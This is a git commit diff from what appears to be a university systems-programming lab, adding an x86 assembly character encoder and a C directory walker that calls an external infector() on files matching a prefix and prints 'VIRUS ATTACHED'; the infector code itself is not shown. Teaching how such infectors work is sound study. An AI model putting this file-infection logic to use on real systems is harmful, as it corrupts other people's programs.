06e64a2cff4abf14eba70160b4608e03219ade5d
oriadik@a <oriadik@post.bgu.ac.il>
2024-12-18 03:05:22 +0200

    start debbuging

--- task1/start.s
+++ task1/start.s
@@ -1,40 +1,155 @@
+%define syscall_exit    1
+%define syscall_read    3
+%define syscall_write   4
+%define syscall_open    5
+%define syscall_close   6
+
+%define O_RDONLY        0
+%define O_WRONLY        1
+%define O_CREAT         0x40
+%define O_TRUNC         0x200
+
+section .data
+    input_flag db "-i", 0         ; "-i" flag
+    output_flag db "-o", 0        ; "-o" flag
+    newline db 10, 0              ; newline character for output
+    error_msg db "Error: Invalid argument", 10
+    error_len equ $ - error_msg
+    char_buffer db 0              ; single character buffer
+
+section .bss
+    infile resd 1                 ; input file descriptor
+    outfile resd 1                ; output file descriptor
+
 section .text
-global _start
-global system_call
-extern main
+extern strlen                     ; Externally provided strlen function
+global _start                     ; Entry point
+
 _start:
-    pop    dword ecx    ; ecx = argc
-    mov    esi,esp      ; esi = argv
-    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
-    mov     eax,ecx     ; put the number of arguments into eax
-    shl     eax,2       ; compute the size of argv in bytes
-    add     eax,esi     ; add the size to the address of argv 
-    add     eax,4       ; skip NULL at the end of argv
-    push    dword eax   ; char *envp[]
-    push    dword esi   ; char* argv[]
-    push    dword ecx   ; int argc
+    ; Initialize file descriptors
+    mov dword [infile], 0         ; Default to stdin
+    mov dword [outfile], 1        ; Default to stdout
 
-    call    main        ; int main( int argc, char *argv[], char *envp[] )
+    ; Parse command-line arguments
+    mov ecx, [esp]                ; argc (argument count)
+    mov esi, [esp + 4]            ; argv (pointer to arguments array)
+    add esi, 4                    ; Skip program name (argv[0])
 
-    mov     ebx,eax
-    mov     eax,1
-    int     0x80
-    nop
-        
-system_call:
-    push    ebp             ; Save caller state
-    mov     ebp, esp
-    sub     esp, 4          ; Leave space for local var on stack
-    pushad                  ; Save some more caller state
+    call parse_args
 
-    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
-    mov     ebx, [ebp+12]   ; Next argument...
-    mov     ecx, [ebp+16]   ; Next argument...
-    mov     edx, [ebp+20]   ; Next argument...
-    int     0x80            ; Transfer control to operating system
-    mov     [ebp-4], eax    ; Save returned value...
-    popad                   ; Restore caller state (registers)
-    mov     eax, [ebp-4]    ; place returned value where caller can see it
-    add     esp, 4          ; Restore caller state
-    pop     ebp             ; Restore caller state
-    ret                     ; Back to caller
+    ; Perform encoding
+    call encode_input
+
+    ; Exit program
+    mov eax, syscall_exit
+    xor ebx, ebx
+    int 0x80
+
+; ------------------------------------------------------
+; parse_args: Parses command-line arguments for -i and -o
+; ------------------------------------------------------
+parse_args:
+    cmp ecx, 1                    ; Check if there are arguments
+    jle end_parse_args
+
+arg_loop:
+    cmp ecx, 1                    ; Check if all arguments are processed
+    jle end_parse_args
+
+    mov edi, [esi]                ; Load current argument
+    test edi, edi                 ; Ensure it's not NULL
+    jz next_arg
+
+    cmp byte [edi], '-'           ; Check if the argument starts with '-'
+    jne next_arg
+
+    ; Check for input flag "-i"
+    cmp dword [edi], '-i'
+    je open_input
+
+    ; Check for output flag "-o"
+    cmp dword [edi], '-o'
+    je open_output
+
+next_arg:
+    add esi, 4                    ; Move to the next argument
+    dec ecx                       ; Decrement argument count
+    jmp arg_loop
+
+open_input:
+    add edi, 2                    ; Skip "-i"
+    mov eax, syscall_open
+    mov ebx, edi                  ; File name
+    mov ecx, O_RDONLY             ; Read-only
+    int 0x80
+    cmp eax, 0                    ; Check if open succeeded
+    jl error_open
+    mov [infile], eax             ; Save input file descriptor
+    jmp next_arg
+
+open_output:
+    add edi, 2                    ; Skip "-o"
+    mov eax, syscall_open
+    mov ebx, edi                  ; File name
+    mov ecx, O_WRONLY | O_CREAT | O_TRUNC ; Write-only, create, truncate
+    mov edx, 0666                 ; Permissions for new file
+    int 0x80
+    cmp eax, 0                    ; Check if open succeeded
+    jl error_open
+    mov [outfile], eax            ; Save output file descriptor
+    jmp next_arg
+
+error_open:
+    mov eax, syscall_write
+    mov ebx, 2                    ; stderr
+    mov ecx, error_msg
+    mov edx, error_len
+    int 0x80
+    mov eax, syscall_exit
+    xor ebx, ebx
+    int 0x80
+
+end_parse_args:
+    ret
+
+; ------------------------------------------------------
+; encode_input: Reads characters, encodes, and writes output
+; ------------------------------------------------------
+encode_input:
+    mov ebx, [infile]             ; Input file descriptor
+    test ebx, ebx
+    jnz read_input
+    mov ebx, 0                    ; Default to stdin
+
+read_input:
+    mov eax, syscall_read
+    mov ecx, char_buffer
+    mov edx, 1                    ; Read one character
+    int 0x80
+    test eax, eax                 ; Check for EOF or error
+    jle end_encode
+
+    ; Encode character
+    mov al, [char_buffer]
+    cmp al, 'A'
+    jl write_output               ; Skip encoding if < 'A'
+    cmp al, 'z'
+    jg write_output               ; Skip encoding if > 'z'
+    inc al                        ; Increment character
+
+write_output:
+    mov [char_buffer], al
+    mov eax, syscall_write
+    mov ebx, [outfile]            ; Output file descriptor
+    test ebx, ebx
+    jnz use_output
+    mov ebx, 1                    ; Default to stdout
+
+use_output:
+    mov ecx, char_buffer
+    mov edx, 1
+    int 0x80
+    jmp read_input
+
+end_encode:
+    ret
--- task2/main.c
+++ task2/main.c
@@ -1,18 +1,57 @@
-#include "util.h"
+#include "Util.h"
 
 #define SYS_WRITE 4
-#define STDOUT 1
 #define SYS_OPEN 5
-#define O_RDWR 2
-#define SYS_SEEK 19
-#define SEEK_SET 0
-#define SHIRA_OFFSET 0x291
+#define SYS_CLOSE 6
+#define SYS_GETDENTS 141
+#define SYS_EXIT 1
+#define STDOUT 1
+#define STDERR 2
+#define BUF_SIZE 8192
+
+struct linux_dirent {
+    unsigned long  d_ino;
+    unsigned long  d_off;
+    unsigned short d_reclen;
+    char           d_name[];
+};
 
 extern int system_call();
+extern void infection();
+extern void infector(char *file);
 
-int main (int argc , char* argv[], char* envp[])
-{
-  /*Complete the task here*/
+int main(int argc, char *argv[], char *envp[]) {
+    char buf[BUF_SIZE];
+    struct linux_dirent *d;
+    int fd, nread, bpos;
 
-  return 0;
+    fd = system_call(SYS_OPEN, ".", 0, 0777);
+    if (fd < 0) {
+        system_call(SYS_WRITE, STDERR, "Error: Cannot open directory\n", 29);
+        system_call(SYS_EXIT, 0x55);
+    }
+
+    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
+    if (nread < 0) {
+        system_call(SYS_WRITE, STDERR, "Error: Cannot read directory\n", 29);
+        system_call(SYS_EXIT, 0x55);
+    }
+
+    for (bpos = 0; bpos < nread;) {
+        d = (struct linux_dirent *)(buf + bpos);
+        system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
+        system_call(SYS_WRITE, STDOUT, "\n", 1);
+
+        if (argc > 1 && argv[1][0] == '-' && argv[1][1] == 'a') {
+            char *prefix = argv[1] + 2;
+            if (strncmp(d->d_name, prefix, strlen(prefix)) == 0) {
+                infector(d->d_name);
+                system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED\n", 15);
+            }
+        }
+        bpos += d->d_reclen;
+    }
+
+    system_call(SYS_CLOSE, fd);
+    return 0;
 }
